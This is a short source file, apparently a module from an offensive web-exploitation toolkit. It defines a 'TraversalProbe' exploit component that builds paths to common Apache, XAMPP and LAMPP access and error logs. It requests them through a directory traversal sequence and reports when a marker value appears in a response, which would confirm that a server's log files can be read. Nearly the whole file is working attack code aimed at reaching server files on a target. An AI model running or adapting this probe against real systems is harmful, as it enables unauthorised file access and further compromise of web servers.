import('urllib2');

class init ExploitComponent TraversalProbe {
    dirs = [
        [ 'apache', 'logs' ],
        [ 'apache2', 'logs' ],
        [ 'etc', 'httpd', 'logs' ],
        [ 'opt', 'lampp', 'logs' ],
        [ 'usr', 'local', 'apache', 'logs' ],
        [ 'var', 'log' ],
        [ 'var', 'log', 'apache' ],
        [ 'var', 'log', 'apache2' ],
        [ 'var', 'log', 'httpd' ],
        [ 'var', 'www', 'logs' ],
        [ 'xampp', 'apache', 'logs' ],
    ],

    names = [
        'access.log',
        'access_log',
        'acces.log',
        'acces_log',
        'error.log',
        'error_log'
    ],

    __init__: @(value, next_url, next_data=None, dot='.',
                separator='/', terminator='', min=0, max=8) {
        self.files = self.create_paths();
	},

	create_paths: @()
		self.dirs
		@selectMany(@(x) self.names @select(@(y) x + [y])),

    seqs: @()
        TraversalRange(self.files, self.min, self.max, self.dot,
                       self.separator, self.terminator),

    scan: @{
        for (x in self.seqs()) {
            r = self.test_seq(x);
            if (r != null) ret r;
		}
	},

    test_seq: @(seq) {
        url = self.next_url(seq);
        self.log('[?] %s' % url);
        data = self.next_data ? self.next_data(seq) : null;
        resp = urllib2.urlopen(url, data).read();
		t = url, data;
        ret resp.__contains__(self.value) ? t : null;
	},
};